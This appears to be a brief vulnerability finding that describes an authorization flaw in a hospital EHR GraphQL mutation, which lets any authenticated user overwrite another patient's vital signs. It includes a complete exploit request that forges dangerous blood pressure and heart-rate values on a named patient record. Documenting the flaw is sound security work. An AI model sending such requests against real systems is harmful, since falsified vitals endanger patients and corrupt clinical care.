diagnosis: The UpdatePatientVitals GraphQL mutation resolver accepts patientID as an unverified argument and persists new vital sign measurements. Any authenticated user or nurse from an unrelated department can forge or corrupt clinical vitals (blood pressure, heart rate) on other patients' charts, directly compromising patient safety.
exploit_request:
POST /graphql HTTP/1.1
Host: ehr.hospital-network.org
Authorization: Bearer nurse_token_site_east
Content-Type: application/json

{"query": "mutation { updatePatientVitals(patientId: \"pat_8911\", input: { systolic: 190, diastolic: 110, heartRate: 140 }) { id recordedAt } }"}
